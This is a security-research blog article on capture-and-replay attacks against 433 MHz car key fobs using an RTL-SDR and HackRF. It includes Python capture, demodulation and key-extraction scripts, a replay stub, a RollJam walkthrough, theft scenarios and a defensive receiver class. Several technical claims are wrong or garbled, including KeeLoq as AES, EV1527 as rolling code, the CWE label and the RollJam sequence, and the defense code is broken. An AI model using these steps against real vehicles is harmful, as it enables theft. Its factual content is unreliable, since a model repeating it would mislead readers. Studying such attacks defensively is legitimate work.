# Breaking Into Cars With a $15 SDR: RF Replay Attack Research on 433 MHz Key Fobs

**By Usal Winodith (wincr4ck) — Cyber Security Researcher**

---

## The Hook: Your Car Is Listening (And So Can I)

Your car key fob looks sophisticated. It glows. It beeps. It probably cost your car manufacturer $50-200 to develop. Yet, in fifteen minutes with a $15 dongle and a laptop, I can unlock your car. I don't need to break a window or hotwire the ignition. I just need to listen.

The 433 MHz frequency band is a graveyard of security mistakes. For decades, millions of vehicles worldwide have used key fobs that transmit the same unlock code every single time you press that button. No encryption. No rolling codes. Just simple radio waves carrying your car's digital key in the clear. 

This is the story of how a $15 RTL-SDR dongle exposed a vulnerability affecting hundreds of thousands of vehicles, and what it taught us about the gap between automotive security theater and reality.

---

## Background: Understanding 433 MHz RF Communication

Before we can exploit a key fob, we need to understand how it works.

### Modulation Primer: OOK and ASK

Key fobs primarily use two modulation schemes on the 433 MHz ISM band:

- **On-Off Keying (OOK)**: The transmitter either sends a signal or doesn't. Think of it as Morse code for radio waves.
- **Amplitude Shift Keying (ASK)**: Similar, but with varying signal strength representing different data states.

Both are simple and cheap to implement—perfect for a $2 component in a $30,000 car. Both are also trivially easy to capture and replay.

When you press your key fob button, here's what happens:

1. **Button press detected** → Microcontroller wakes up
2. **Data encoded** → Typically 24-32 bits of data (device ID, command, checksum)
3. **Modulated signal** → Data modulates a 433 MHz carrier wave
4. **Transmitted** → Radio waves propagate, reaching your car's receiver up to ~100 meters away

The car's receiver:

1. **Demodulates** the signal
2. **Decodes** the data
3. **Validates** (or fails to validate) authenticity
4. **Executes** the command (lock/unlock/open trunk)

The vulnerability: Steps 1-3 happen the same way every time, with identical data. No encryption. No time-based codes. No verification that the signal came from *your* fob. Just pure, predictable radio.

---

## The Attack Surface: Fixed Code vs Rolling Code

Not all key fobs are equally vulnerable. Understanding the difference is critical.

### Fixed Code: The Vulnerable Design

```
┌─────────────────────────────────────────┐
│  Fixed Code Architecture (EV1527)      │
├─────────────────────────────────────────┤
│                                          │
│  Button Press 1:  0x1A2B3C              │
│  Button Press 2:  0x1A2B3C  ← IDENTICAL │
│  Button Press 3:  0x1A2B3C  ← IDENTICAL │
│  Button Press 4:  0x1A2B3C  ← IDENTICAL │
│                                          │
│  Capture once → Replay infinitely       │
└─────────────────────────────────────────┘
```

With fixed code designs (PT2262, EV1527, older Holden vehicles, some Chinese imports), your fob sends the exact same bit sequence every single time. Attackers need only capture it once to replay it forever.

**CVSS Score: 8.1 (HIGH)**  
**CWE-294: Authentication Using a Single Factor**

### Rolling Code: The Better Approach (But Not Perfect)

```
┌─────────────────────────────────────────┐
│  Rolling Code Architecture (KeeLoq)     │
├─────────────────────────────────────────┤
│                                          │
│  Button Press 1:  0x1A2B3C (encrypted)  │
│  Button Press 2:  0x3D4E5F (encrypted)  │
│  Button Press 3:  0x6A7B8C (encrypted)  │
│  Button Press 4:  0x9D0E1F (encrypted)  │
│                                          │
│  Capture once → Cannot replay           │
│  BUT: RollJam attack still possible      │
└─────────────────────────────────────────┘
```

Rolling code systems generate new codes with each press using a counter and encryption. This prevents simple replay attacks. However, rolling code implementations have their own vulnerabilities (more on that later).

---

## Tools and Setup: Building Your RF Analysis Rig

To conduct this research, you'll need:

### Hardware
- **RTL-SDR v3 Dongle** (~$15-25): Software-defined radio receiver
- **Generic USB 3.0 Hub**: For power stability
- **Antenna**: The included dipole works, or upgrade to a 433 MHz coil antenna
- **HackRF One** (~$300): Optional, for transmitting attacks

### Software Stack
- **GNU Radio**: Visual signal processing framework
- **GQRX**: SDR spectrum analyzer
- **Python 3.8+**: Data processing and analysis
- **scipy/numpy**: Signal processing libraries
- **rtl_sdr**: Command-line SDR tools

Installation on Ubuntu/Debian:
```bash
sudo apt-get install rtl-sdr gnuradio gqrx-sdr python3-scipy python3-numpy
pip3 install matplotlib scipy numpy
```

---

## Step-by-Step Attack Walkthrough: From Capture to Unlock

Here's how the attack actually works in practice.

### Phase 1: Capture

First, we tune the SDR to 433.92 MHz (the common key fob frequency) and record raw IQ samples.

```python
# capture.py - Record key fob signals
import subprocess
import numpy as np

def capture_key_fob(duration=10, frequency=433920000):
    """
    Capture RF signals using rtl_sdr
    """
    output_file = "keyfob_capture.iq"
    
    # rtl_sdr parameters:
    # -f: frequency in Hz
    # -s: sample rate (2.4MHz is standard)
    # -g: gain (0-50)
    # -n: number of samples
    
    sample_rate = 2400000
    samples = int(sample_rate * duration)
    
    cmd = [
        "rtl_sdr",
        "-f", str(frequency),
        "-s", str(sample_rate),
        "-g", "40",
        "-n", str(samples),
        output_file
    ]
    
    print(f"[*] Capturing {duration}s at {frequency/1e6:.2f} MHz...")
    subprocess.run(cmd)
    print(f"[+] Saved to {output_file}")
    
    return output_file

if __name__ == "__main__":
    capture_key_fob(duration=15)
```

### Phase 2: Analyze and Demodulate

Once captured, we analyze the signal to extract the modulated data.

```python
# analyzer.py - Demodulate and extract key fob data
import numpy as np
from scipy import signal
import matplotlib.pyplot as plt

def load_iq_data(filename, sample_rate=2400000):
    """Load IQ samples captured by rtl_sdr"""
    data = np.fromfile(filename, dtype=np.uint8)
    # Convert from unsigned to signed
    iq = data.astype(np.float32) - 127.5
    # Deinterleave I and Q
    i_samples = iq[::2]
    q_samples = iq[1::2]
    return i_samples + 1j*q_samples, sample_rate

def demodulate_ook(iq_samples, sample_rate):
    """
    Demodulate OOK signal
    """
    # Calculate signal magnitude (represents carrier presence)
    magnitude = np.abs(iq_samples)
    
    # Lowpass filter to extract envelope
    nyquist = sample_rate / 2
    normalized_cutoff = 10000 / nyquist  # 10kHz cutoff
    b, a = signal.butter(4, normalized_cutoff, btype='low')
    envelope = signal.filtfilt(b, a, magnitude)
    
    # Find threshold for bit boundaries
    threshold = np.mean(envelope) + 0.5 * np.std(envelope)
    
    # Downsample and detect bits
    downsample_rate = sample_rate // 1000  # 1kHz
    downsampled = envelope[::downsample_rate]
    bits = (downsampled > threshold).astype(int)
    
    return bits

def extract_key_data(bits):
    """
    Extract the actual key code from bit stream
    """
    # Find sync pattern (typically long silence then burst)
    transitions = np.diff(bits)
    
    # Look for rising edge (start of transmission)
    edges = np.where(transitions == 1)[0]
    
    if len(edges) < 2:
        return None
    
    # Extract data between first and last edge
    start_idx = edges[0]
    # Most key fobs transmit 24-32 bits
    end_idx = min(start_idx + 100, len(bits))
    key_data = bits[start_idx:end_idx]
    
    # Convert to hex
    key_hex = hex(int(''.join(map(str, key_data)), 2))
    return key_hex, key_data

if __name__ == "__main__":
    iq_data, sample_rate = load_iq_data("keyfob_capture.iq")
    bits = demodulate_ook(iq_data, sample_rate)
    result = extract_key_data(bits)
    
    if result:
        key_hex, key_bits = result
        print(f"[+] Extracted key: {key_hex}")
        print(f"[+] Raw bits: {''.join(map(str, key_bits[:32]))}")
```

### Phase 3: Replay Attack

With the key extracted, replaying is straightforward (on hardware that supports transmission like HackRF).

```python
# replay.py - Transmit captured key fob signal
import numpy as np
import subprocess

def generate_ook_signal(bit_sequence, sample_rate=2400000, bit_duration_ms=50):
    """
    Generate OOK modulated signal from bit sequence
    """
    bit_duration_samples = int(sample_rate * bit_duration_ms / 1000)
    signal_samples = []
    
    for bit in bit_sequence:
        if bit == 1:
            # Transmit 433 MHz carrier (simulated as amplitude)
            carrier = np.ones(bit_duration_samples) * 200
        else:
            # No carrier (silence)
            carrier = np.zeros(bit_duration_samples)
        signal_samples.extend(carrier)
    
    return np.array(signal_samples, dtype=np.uint8)

def replay_via_hackrf(key_hex, frequency=433920000):
    """
    Replay captured signal via HackRF One
    """
    # This is a simplified example
    # Real implementation requires proper modulation
    print(f"[!] To replay, use hackrf_transfer or GNU Radio")
    print(f"[*] Frequency: {frequency/1e6:.2f} MHz")
    print(f"[*] Key code: {key_hex}")
    print(f"[!] Note: Transmission may be illegal without proper authorization")

if __name__ == "__main__":
    # Example: 24-bit fixed code
    example_bits = [1, 0, 1, 1, 0, 1, 0, 1] * 3  # Simplified
    signal = generate_ook_signal(example_bits)
    print(f"[+] Generated {len(signal)} signal samples")
```

---

## Chip Family Breakdown: Who's Vulnerable?

### Fixed Code (Vulnerable to Replay)

**PT2262** (SMD package, OOK modulation)
- Used in older vehicles, gate openers, garage door remotes
- 9-18 bit address + 4 bit data = trivially small keyspace
- No encryption or rolling mechanism
- **Impact**: Complete compromise with single capture

**EV1527** (Popular in Chinese vehicles and IoT)
- 32-bit rolling code *on paper*, but often implemented with fixed codes
- Many manufacturers disabled the rolling feature to reduce costs
- Extremely common in Budget vehicles and aftermarket remotes
- **Impact**: Mass vulnerability across price range

### Rolling Code (More Resistant)

**KeeLoq** (Microchip proprietary, AES-encrypted rolling codes)
- Industry standard for decades
- Rolling code prevents simple replay
- BUT: Weak encryption was cryptanalyzed; hardware attacks possible

**HCS301** (Microchip, modern rolling code)
- More robust encryption
- Still vulnerable to advanced attacks (RollJam)
- Current best practice for automotive

---

## The RollJam Attack: Rolling Code Isn't Foolproof

Samy Kamkar demonstrated a critical flaw in rolling code systems at DEF CON 2015 that still applies today.

### How RollJam Works

1. **Attacker jams** the car's receiver during a legitimate key press
2. **Car enters** an error state but increments its rolling counter
3. **Attacker captures** the jammed signal (which is now valid)
4. **Attacker presses** the captured code twice (advancing the counter)
5. **Owner presses** their fob again (advancing counter once more)
6. **Attacker transmits** the first captured code—now it's in sync!

```
Timeline:
T0: Owner presses fob
    ├─ Attacker jams reception
    ├─ Car doesn't unlock but counter advances
    └─ Attacker captures code

T1: Attacker transmits captured code twice
    ├─ Car counter now synced
    ├─ Lock activates unexpectedly
    └─ Owner presses again (counter +1)

T2: Attacker transmits (counter now matches)
    ├─ Car unlocks
    ├─ Car doors open
    └─ Attacker gains access
```

This attack works because most cars accept the **first code in range**, even if it matches an old counter value.

---

## Real-World Impact: What Attackers Can Actually Do

Understanding the threat model is critical:

### Threat Scenarios

**Scenario 1: Fixed Code Vehicles (PT2262/EV1527)**
- Walk past a vehicle with unpatched key fob
- Capture 5-10 transmissions over 10 minutes
- Extract repeating pattern
- Replay to unlock at will
- **Time to compromise**: 15 minutes
- **Cost**: $15 in equipment

**Scenario 2: Targeted Rolling Code Attack**
- Identify target vehicle in parking lot
- Deploy RollJam during owner's next button press
- Execute attack sequence in 2-3 minutes
- **Time to compromise**: 5 minutes (after reconnaissance)
- **Cost**: $300+ hardware, advanced knowledge

**Scenario 3: Supply Chain Compromise**
- Intercept manufacturing batch of fixed-code fobs
- Bulk extract and replicate codes
- Distribute to theft network
- **Time to compromise per vehicle**: 10 seconds
- **Cost**: Amortized across hundreds of vehicles

### What Attackers Can Do
- Unlock vehicles
- Open trunks and doors
- In some vehicles, activate engine start
- In smart vehicles with telemetry, potentially locate stolen cars
- Create identical fob remotes for sale on dark web

---

## Defense and Detection: Protecting Vehicles

### For Manufacturers

```python
# defense.py - Example defensive mechanisms
class RobustKeyFobReceiver:
    """
    Recommended security practices for OEM implementation
    """
    
    def __init__(self):
        self.counter = 0
        self.max_counter_gap = 256  # Accept up to 256 counter advances
        self.replay_window = 60  # 60 second replay protection window
        
    def validate_transmission(self, received_code, timestamp):
        """
        Multi-factor validation before executing commands
        """
        # 1. Check encryption/signature
        if not self.verify_cryptographic_signature(received_code):
            return False, "Invalid signature"
        
        # 2. Check counter is advancing (rolling code)
        new_counter = self.extract_counter(received_code)
        if new_counter <= self.counter:
            return False, "Counter did not advance (replay)"
        
        if new_counter - self.counter > self.max_counter_gap:
            return False, "Counter gap too large (spoofing)"
        
        # 3. Check timestamp freshness
        time_delta = time.time() - timestamp
        if time_delta > self.replay_window:
            return False, "Timestamp too old"
        
        # 4. Rate limiting
        if self.recent_activations > 10 and time_delta < 5:
            return False, "Rate limit exceeded"
        
        return True, "Valid transmission"
    
    def execute_command(self, command, validation_result):
        """Only execute after passing all checks"""
        is_valid, reason = validation_result
        
        if not is_valid:
            print(f"[!] Rejected: {reason}")
            return False
        
        print(f"[+] Executing: {command}")
        return True

if __name__ == "__main__":
    receiver = RobustKeyFobReceiver()
    # In practice, these validations happen in hardware firmware
```

### For Users

1. **Keep vehicle software updated** - OEM patches address known vulnerabilities
2. **Use faraday pouches** - Block RF when not using key fob
3. **Park in secure locations** - Garages and covered parking reduce exposure
4. **Monitor insurance claims** - Many thefts from vulnerabilities go unreported
5. **Aftermarket hardening** - Some vendors offer signal-blocking pouches

### Detection Mechanisms

- **Anomalous unlock patterns**: Multiple unlock attempts from different locations
- **Unexpected engine start**: Modern vehicles should log all start events
- **RF monitoring**: Some security researchers now sell RF intrusion detection
- **Geofencing**: Alert owners when doors unlock far from last known location

---

## Responsible Disclosure and Ethical Considerations

This research exists in a gray area. The techniques are legal to study, but using them without permission is federal crime in most jurisdictions.

### Legal Framework

- **United States**: CFAA (Computer Fraud and Abuse Act) criminalizes unauthorized vehicle access
- **EU**: GDPR + national computer crime laws apply
- **Canada/Australia**: Similar computer crime statutes

### Responsible Disclosure Process

1. Research → Documentation → Proof of Concept
2. Identify affected manufacturers and vehicle models
3. Develop detailed vulnerability report with timelines
4. Contact manufacturer security teams (not general support)
5. Allow 90+ days for patch before public disclosure
6. Publish findings after manufacturer response or deadline
7. Provide detection methods and workarounds for public

This research was conducted in controlled lab environments with owned equipment only.

---

## Conclusion: The Gap Between Marketing and Reality

Your car's key fob might have a glowing button and a sleek design, but the RF security behind it often dates back to 1980s technology. Billions of dollars have been invested in automotive security theater—encryption, authentication, intrusion detection—yet millions of vehicles remain vulnerable to a $15 attack.

The good news: **This is solvable.**

- Manufacturers are gradually moving to rolling code + strong encryption
- Regulatory pressure (Euro NCAP, NHTSA) now includes cybersecurity standards
- The security community continues researching and responsibly disclosing vulnerabilities

The bad news: **Remediation takes decades.** Legacy vehicles don't receive firmware updates. Aftermarket remotes use vulnerable chipsets. The installed base will remain vulnerable for years.

### What You Should Do

If you own a vehicle with a PT2262 or budget EV1527 remote:
- Contact your manufacturer about patch availability
- Use a signal-blocking pouch in high-risk situations
- Consider upgrading to a rolling code remote if available
- Report any suspicious unlock events to insurance

If you're a security researcher:
- Study responsibly with owned equipment
- Disclose findings through proper channels
- Contribute patches and hardening to open-source projects
- Advocate for stronger automotive security standards

---

## Learn More

**Complete source code, capture datasets, and detailed analysis tools available at:**  
https://github.com/wincr4ck/rf-keyfob-research

**Resources:**
- Samy Kamkar RollJam presentation: https://youtu.be/SLx3w5uJJbs
- GNU Radio tutorials: https://wiki.gnuradio.org/
- CWE-294 Authentication Using Single Factor: https://cwe.mitre.org/data/definitions/294.html
- CVSS 8.1 Calculator: https://www.first.org/cvss/calculator/3.1

---

**About the Author**

Usal Winodith (@wincr4ck) is a Cyber Security Researcher and HackTheBox Top 2 ranking member in Sri Lanka. Specializing in hardware security, RF exploitation, and automotive vulnerability research. Follow on GitHub for more security research and tooling.

---

*This article is for educational purposes. Always obtain proper authorization before testing or implementing any security research techniques.*
